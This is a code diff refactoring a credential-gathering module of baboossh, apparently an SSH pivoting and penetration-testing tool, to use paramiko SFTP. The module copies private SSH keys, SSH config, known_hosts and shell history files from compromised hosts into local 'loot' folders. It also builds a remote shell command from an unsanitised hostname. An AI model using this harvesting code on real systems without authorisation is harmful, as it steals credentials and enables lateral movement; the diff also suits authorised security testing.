@@ -11,6 +11,10 @@ from baboossh.user import User
 from baboossh.path import Path
 from baboossh.creds import Creds
 from baboossh.exceptions import ConnectionClosedError
+from paramiko.py3compat import u
+from paramiko import SSHException
+from paramiko import SFTPClient
+import socket
 
 class ExtStr(type):
     def __str__(self):
@@ -35,6 +39,8 @@ class BaboosshExt(object,metaclass=ExtStr):
             h = out.split(" ",1)[0]
             self.keysHash[h] = path
 
+        self.sftp = SFTPClient.from_transport(self.connection.transport)
+
 
     @classmethod
     def getModType(cls):
@@ -54,19 +60,19 @@ class BaboosshExt(object,metaclass=ExtStr):
 
     @classmethod
     def run(cls, connection, wspaceFolder, stmt):
-        if connection.conn is None:
+        if connection.transport is None:
             raise ConnectionClosedError
         g = cls(connection, wspaceFolder)
         try:
             g.gather()
         except Exception as e:
+            raise e
             print("Error : "+str(e))
             return False
         return True
     
     def gather(self):
         print("Starting gathering...")
-        sys.stdout.flush()
 
         print("From SSH user config")
         self.gatherFromConfig()
@@ -89,6 +95,7 @@ class BaboosshExt(object,metaclass=ExtStr):
         print("\nEndpoints :")
         for endpoint in self.newEndpoints:
             print(" - "+str(endpoint))
+        self.sftp.close()
 
     def hostnameToIP(self,hostname,port=None):
         endpoints = []
@@ -96,8 +103,19 @@ class BaboosshExt(object,metaclass=ExtStr):
         try:
             ipobj = ipaddress.ip_address(hostname)
         except ValueError:
-            res = self.connection.conn.run("getent hosts "+hostname+" | awk '{ print $1 }'", hide="both", warn=True)
-            ips = res.stdout.splitlines()
+            chan = self.connection.transport.open_channel("session",timeout=3)
+            ips = ""
+            chan.exec_command("getent hosts "+hostname+" | awk '{ print $1 }'")
+            try:
+                x = u(chan.recv(1024))
+                while len(x) != 0:
+                    ips = ips + x
+                    x = u(chan.recv(1024))
+            except socket.timeout:
+                pass
+            chan.close()
+
+            ips = ips.splitlines()
             for ip in ips:
                 ipobj = ipaddress.ip_address(ip)
                 if ipobj.is_loopback:
@@ -139,10 +157,12 @@ class BaboosshExt(object,metaclass=ExtStr):
         lootFolder = os.path.join(self.wspaceFolder,"loot")
         filename = str(self.connection.endpoint).replace(":","-")+"_"+str(self.connection.user)+"_.ssh_config"
         filepath = os.path.join(lootFolder,filename)
+
         try:
-            self.connection.conn.get(".ssh/config",filepath)
+            self.sftp.get(".ssh/config",filepath)
         except Exception as e:
             return None
+
         with open(filepath,'r',errors='replace') as f:
             data = f.read()
         lines = data.split('\n')
@@ -216,7 +236,7 @@ class BaboosshExt(object,metaclass=ExtStr):
         filename = str(self.connection.endpoint).replace(':','-')+"_"+str(self.connection.user)+"_.ssh_known_hosts"
         filepath = os.path.join(lootFolder,filename)
         try:
-            self.connection.conn.get(".ssh/known_hosts",filepath)
+            self.sftp.get(".ssh/known_hosts",filepath)
         except Exception as e:
             return None
         with open(filepath,'r',errors='replace') as f:
@@ -235,10 +255,13 @@ class BaboosshExt(object,metaclass=ExtStr):
     def gatherKeys(self):
         files = []
         ret = []
-        result = self.connection.conn.run("ls -A .ssh", hide="both", warn=True)
-        for line in result.stdout.splitlines():
-            if "rsa" in line or "key" in line or "p12" in line or "dsa" in line:
-                files.append(line)
+        chan = self.connection.transport.open_channel("session",timeout=3)
+        filelist = self.sftp.listdir_attr(".ssh")
+        for file in filelist:
+            if file.st_size == 0:
+                continue
+            if "rsa" in file.filename or "key" in file.filename or "p12" in file.filename or "dsa" in file.filename:
+                files.append(file.filename)
         for keyfile in files:
             c = self.getKeyToCreds(keyfile)
 
@@ -250,7 +273,7 @@ class BaboosshExt(object,metaclass=ExtStr):
         filename = str(self.connection.endpoint).replace(":","-")+"_"+str(self.connection.user)+"_"+keyfile.replace("/","_")
         filepath = os.path.join(keysFolder,filename)
         try:
-            self.connection.conn.get(keyfile,filepath)
+            self.sftp.get(keyfile,filepath)
         except Exception as e:
             print(e)
             return None
@@ -280,10 +303,10 @@ class BaboosshExt(object,metaclass=ExtStr):
 
     def listHistoryFiles(self):
         ret = []
-        result = self.connection.conn.run("ls -A", hide="both", warn=True)
-        for line in result.stdout.splitlines():
-            if "history" in line:
-                ret.append(line)
+        files = self.sftp.listdir_attr(".")
+        for file in files:
+            if "history" in file.filename and file.st_size != 0:
+                ret.append(file.filename)
         return ret
 
     def gatherFromHistory(self,historyFile):
@@ -291,7 +314,7 @@ class BaboosshExt(object,metaclass=ExtStr):
         filename = str(self.connection.endpoint).replace(":","-")+"_"+str(self.connection.user)+"_"+historyFile.replace("/","_")
         filepath = os.path.join(lootFolder,filename)
         try:
-            self.connection.conn.get(historyFile,filepath)
+            self.sftp.get(historyFile,filepath)
         except Exception as e:
             print(e)
             return None
